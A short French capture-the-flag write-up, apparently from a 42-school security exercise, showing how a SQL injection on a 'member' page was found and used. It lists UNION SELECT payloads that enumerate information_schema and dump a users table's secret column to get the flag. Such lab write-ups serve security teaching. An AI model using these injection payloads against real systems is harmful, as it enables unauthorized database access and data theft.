<h1>Faille</h1>

Sur la page `member`, il y a une SQL Injection.
Au début, j'ai affiché tous les users de la table avec `1 or 1` ce qui me permet de constater qu’il y a une SQL Injection.

`1 or 1`<br>
```1 UNION SELECT table_name, table_type FROM information_schema.tables```

- Rechercher les tableau de type "BASE TABLE"
- db_default `users` guestbook list_images vote_dbs

```1 UNION SELECT table_name, table_schema FROM information_schema.tables```
- Donc table_name: Member_Sql_Injection, table_schema: users

```1 UNION SELECT table_name, column_name FROM information_schema.columns```
- user_id, first_name, last_name, town, country, planet, Commentaire, countersign

```1 or 1 UNION SELECT  countersign, commentaire FROM Member_Sql_Injection.users```

FortyTwo -> lower all the char -> fortytwo -> hash with Sha256 pour trouver le flag le flag

<h1>Éviter cette faille</h1>

Proteger les requetes SQL.

<h1>Ressources</h1>

Information_schema: https://mariadb.com/kb/en/information-schema-columns-table/
